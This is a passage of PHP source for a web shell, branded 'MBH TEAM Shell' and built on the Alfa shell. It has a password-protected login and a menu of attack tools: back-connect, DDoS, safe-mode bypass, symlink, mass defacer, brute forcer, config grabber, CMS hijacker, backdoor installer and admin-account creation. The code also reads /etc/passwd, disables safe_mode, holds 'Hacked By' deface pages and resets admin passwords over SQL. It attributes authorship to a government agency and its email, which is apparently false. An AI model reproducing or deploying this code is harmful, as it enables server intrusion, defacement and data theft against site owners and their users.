...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'f041ae55fca3f3724d1948feafa3f3c8',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
$GLOBALS['__ALFA_COLOR__'] = array(
		"shell_border" => array(
    "key_color" => "#FF0000",  // Ini sudah merah (#FF0000)
    "multi_selector" => array(
        ".header" => "border: 7px solid {color}",  // Border header terminal
        "#meunlist" => "border-color: {color}",
        "#hidden_sh" => "background-color: {color}",
        ".ajaxarea" => "border: 1px solid {color}",  // Border area terminal
...
<title>~ MBH TEAM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="8000" height="250" alt="MBH TEAM 2012" draggable="false" src="https://j.top4top.io/p_3480v9z3j1.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ MBH TEAM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ MBH Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td colspan="2"><span class="header_values" id="header_uname" style="color:white;">'.$uname.'</span></td>
</tr>
<tr>
<td><span class="header_vars" style="color:red;">User:</span></td>
<td><span class="header_values" id="header_userid" style="color:white;">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars" style="color:red;"> Group: </span><span class="header_values" id="header_groupid" style="color:white;">' . $gid . ' [ ' . $group . ' ]</span> </td>
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="MBH TEAM 2012" draggable="false" src="https://i.giphy.com/1154CgmtPPa4lq.webp" /></td>
</tr>
<tr>
<td><span class="header_vars" style="color:red;">PHP:</span></td>
<td><b style="color:white;">'.@phpversion(). ' </b><span class="header_vars" style="color:red;"> Safe Mode: </span><span style="color:white;">'.$safe_modes.'</span></td>
</tr>
<tr>
<td><span class="header_vars" style="color:red;">ServerIP:</span></td>
<td><b style="color:white;">'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars" style="color:red;">Your IP:</span><b style="color:white;"> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
</tr>
<tr>
<td width="3%"><span class="header_vars" style="color:red;">DateTime:</span></td>
<td colspan="2"><b style="color:white;">'.date('Y-m-d H:i:s').'</b></td>
</tr>
<tr>
<td><span class="header_vars" style="color:red;">Domains:</span></td>
<td width="76%"><span class="header_values" id="header_domains" style="color:white;">';
if($GLOBALS['sys']=='unix'){
...
<tr>
<td height="16"><span class="header_vars" style="color:red;">HDD:</span></td>
<td><span class="header_vars" style="color:red;">Total:</span><b style="color:white;">'.alfaSize($totalSpace).' </b><span class="header_vars" style="color:red;">Free:</span><b style="color:white;">' . alfaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
$useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars" style="color:red;">useful:</span><span class="header_values" id="header_useful" style="color:white;">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars" style="color:red;">Downloader: </span><span class="header_values" id="header_downloader" style="color:white;">--------------</span></td></tr>';
if(!@ini_get('safe_mode')){
if(strlen(alfaEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars" style="color:red;">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(alfaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;color:white;">'.$item.'</span>';}
if($x==0){echo "<span class='header_values' id='header_useful' style='color:white;'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>
<tr>
<td height="0" colspan="2"><span class="header_vars" style="color:red;">Downloader: </span>';
$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
$x=0;
foreach($downloaders as $item2)if(alfaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;color:white;">'.$item2.'</span>';}
if($x==0){echo "<span class='header_values' id='header_downloader' style='color:white;'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>';
}else{
...
echo '<tr><td height="18" colspan="2"><span class="header_vars" style="color:red;">Windows:</span><b style="color:white;">';
echo alfaEx('ver',false,false);
echo '</td>
</tr> <tr>
<td height="0" colspan="2"><span class="header_vars" style="color:red;">Downloader: </span><b style="color:white;">-------------</b></td>
</tr></b>';
}
...
echo '<tr>
<td height="16" colspan="2"><span class="header_vars" style="color:red;">Disable Functions: </span><b style="color:white;">'.Alfa_GetDisable_Function().'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars" style="color:red;">CURL :</span><span style="color:white;">'.$curl.'</span> | <span class="header_vars" style="color:red;">SSH2 : </span><span style="color:white;">'.$ssh2.'</span> | <span class="header_vars" style="color:red;">Magic Quotes : </span><span style="color:white;">'.$magic.'</span> | <span class="header_vars" style="color:red;"> MySQL :</span><span style="color:white;">'.$mysql.'</span> | <span class="header_vars" style="color:red;">MSSQL :</span><span style="color:white;">'.$mssql.'</span> | <span class="header_vars" style="color:red;"> PostgreSQL :</span><span style="color:white;">'.$pg.'</span> | <span class="header_vars" style="color:red;"> Oracle :</span><span style="color:white;">'.$or.'</span> '.($GLOBALS['sys']=="unix"?'| <span class="header_vars" style="color:red;"> CGI :</span> <span style="color:white;">'.$cgi_shell.'</span>':"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://www.kominfo.go.id/" target="_blank"><span><font class="solevisible-text" color="#0F0">We Move In Silence</font></span></a></center></div></td>
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars" style="color:red;">Open_basedir :</span><b style="color:white;">'.$open_b.'</b> | <span class="header_vars" style="color:red;">Safe_mode_exec_dir :</span><b style="color:white;">'.$safe_exe.'</b> | <span class="header_vars" style="color:red;"> Safe_mode_include_dir :</span><b style="color:white;">'.$safe_include.'</b></td>
</tr>
<tr>
<td height="11"><span class="header_vars" style="color:red;">SoftWare: </span></td>
<td colspan="2"><b style="color:white;">'.@getenv('SERVER_SOFTWARE').'</b></td>
</tr>';
if($GLOBALS['sys']=="win"){
echo '<tr>
<td height="12"><span class="header_vars" style="color:red;">DRIVE:</span></td>
<td colspan="2"><b style="color:white;">'.$drives.'</b></td>
</tr>';
}
echo '<tr>
<td height="12"><span class="header_vars" style="color:white;">PWD:</span></td>
<td colspan="2"><span id="header_cwd" style="color:white;">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>';
$li = array(
    'proc' => '<span style="color:white;">Process</span>',
    'phpeval' => '<span style="color:white;">Eval</span>',
    'sql' => '<span style="color:white;">SQL Manager</span>',
    'dumper' => '<span style="color:white;">Database Dumper</span>',
    'coldumper' => '<span style="color:white;">Column Dumper</span>',
    'hash' => '<span style="color:white;">En-Decoder</span>',
    'connect' => '<span style="color:white;">BC</span>',
    'zoneh' => '<span style="color:white;">ZONE-H</span>',
    'dos' => '<span style="color:white;">DDOS</span>',
    'safe' => '<span style="color:white;">ByPasser</span>',
    'cgishell' => '<span style="color:white;">Cgi Shell</span>',
    'ssiShell' => '<span style="color:white;">SSI SHELL</span>',
    'cpcrack' => '<span style="color:white;">Hash Tools</span>',
    'portscanner' => '<span style="color:white;">Port Scaner</span>',
    'basedir' => '<span style="color:white;">Open BaseDir</span>',
    'mail' => '<span style="color:white;">Fake Mail</span>',
    'ziper' => '<span style="color:white;">Compressor</span>',
    'deziper' => '<span style="color:white;">DeCompressor</span>',
    'IndexChanger' => '<span style="color:white;">Index Changer</span>',
    'pwchanger' => '<span style="color:white;">Add New Admin</span>',
    'ShellInjectors' => '<span style="color:white;">Shell Injectors</span>',
    'php2xml' => '<span style="color:white;">PHP2XML</span>',
    'cloudflare' => '<span style="color:white;">CloudFlare</span>',
    'Whmcs' => '<span style="color:white;">Whmcs DeCoder</span>',
    'symlink' => '<span style="color:white;">Symlink</span>',
    'MassDefacer' => '<span style="color:white;">Mass Defacer</span>',
    'Crackers' => '<span style="color:white;">BruteForcer</span>',
    'searcher' => '<span style="color:white;">Searcher</span>',
    'config_grabber' => '<span style="color:white;">Config Grabber</span>',
    'fakepage' => '<span style="color:white;">Fake Page</span>',
    'archive_manager' => '<span style="color:white;">Archive Manager</span>',
    'cmshijacker' => '<span style="color:white;">CMS Hijacker</span>',
    'remotedl' => '<span style="color:white;">Remote Upload</span>',
    'inbackdoor' => '<span style="color:white;">Install BackDoor</span>',
    'whois' => '<span style="color:white;">Whois</span>',
    'selfrm' => '<span style="color:white;">Remove Shell</span>'
);
...
echo '</ul><div style="text-align: center;padding: 6px;">
    <a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span style="color:white;">Alfa Settings</span></a>
    <a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus" style="color:white;">Alfa market</span></a>
    <a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span style="color:white;">About Us</span></a>'
    .(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'')
    .'</div>
</div>
<div id="filesman_tabs">
    <div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);">
        <img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span>
    </div>
    <div style="display:inline-block;" id="filesman_tabs_child"></div>
    <div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div>
</div>';
}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
...
function __showicon($r){
	$s['btn']='https://b.top4top.io/p_34808vb4x1.png';
	$s['alfamini']='https://j.top4top.io/p_3480v9z3j1.jpg';
	$s['loader']='https://b.top4top.io/p_3480szlqx1.png';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('MBH TEAM is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>MBH TEAM Uploader</option><option value='my'>My Private Shell</option></select>";
...
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("https://localhost");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://www.kominfo.go.id/images/logo-big.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Kominfo (T3RS4K1T1)</font><br>
<font color='#00A220'>Contact : aduankonten@mail.kominfo.go.id</font><br>
<font color='FFFFFF'>Greetz To :</font><br>
<font color='#FFFFFF'>Vinooo_SyS</font><br>
<font color='#FFFFFF'>T3RS4K1T1</font><br>
<font color='#FFFFFF'>Yteam7</font><br>
<font color='#00A220'>############</font><br>
<font color='#FF0000'>Indonesian</font><font color='#FFFFFF'> Peoples</font><br>
...
echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><fontcolor='#FFFFFF'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
}}}}
...
if(empty($savetoass)){
	$faq_name = "header";
	$faq_file = "/";
	$rec = "select `template` from ".$_POST['alfa6']."templateWHERE title ='".$faq_name."'";
	$recivedata = @mysqli_query($conn,$rec);
	$getd = @mysqli_fetch_assoc($recivedata);
	$savetoass = $getd['template'];
	$code = ALFA_UPLOADER.";";
...
<tr>
<td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text' style='color:red'>Create New File: </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text' style='color:red'>Create New Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text' style='color:red'>Delete File Name : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
<td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text' style='color:red'>Chmod File : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='2' class='red-text'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text' style='color:red'>View Other Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='" . htmlspecialchars($GLOBALS['cwd']) . "'> <input type='submit' value=' '></form></td>
<td colspan='2' class='red-text'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text' style='color:red'>Read Other Dir Files: </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text' style='color:red'>Command :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<span class='footer_text' style='color:red'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ MBH &copy; 2014-".date('Y')." ]</span><br><span><a href='https://websiteseochecker.com/bulk-check-page-authority/;' style='color: #E91E63;text-decoration: none;'>Cek DA-PA Shell Resmi  </a></span> <span style='letter-spacing: 2px;color: #dfff00;'>|| Admin Judi Wajib Mandi ||</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://paste.phyo186.cfd/'>Link raw paste.phyo186</a></span></div></td>
</tr>
</table>
</div>
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' name='delete'><img src=\"https://cdn.kuemeranti.store/images/e7mtduu.ico\"> Delete</a>
</div>
...
.'<tdclass="listing">'.$values['local_value'].' </td>'
...
<textarea name=index rows='19' cols='103'><title>Hacked By vinooo_sys</title><b>Hacked By vinooo_sys</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By vinooo_sys</title><b>Hacked By vinooo_sys</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By vinooo_sys(MBH TEAM)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="MBH TEAM 2012" />
<br>
...
$table = array('td1' =>
 ...
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => '@vinooo_sys', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'vinroot99_-', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'humas@mail.kominfo.go.id', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SETuser_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
	...
	if($conn){
		if($type == "load_all_tables"){
			...
			if($type == "load_data"){
				...
				$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
					$columns[] = $row2;
				}
				if($tbl_count[0] > 30){
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://j.top4top.io/p_3480v9z3j1.jpg\"></p>";
...
AlfaNum(8,9,10);echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>".getConfigHtml('whmcs')."</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
...
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
	...
	switch ($file_type) {
		case 'application/zip':
			$zip =new ZipArchive;$res = $zip->open($dirzip);
			if ($res) {
				$zip->extractTo($zipfile);
				$zip->close();$itsok = true;
			}break;case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
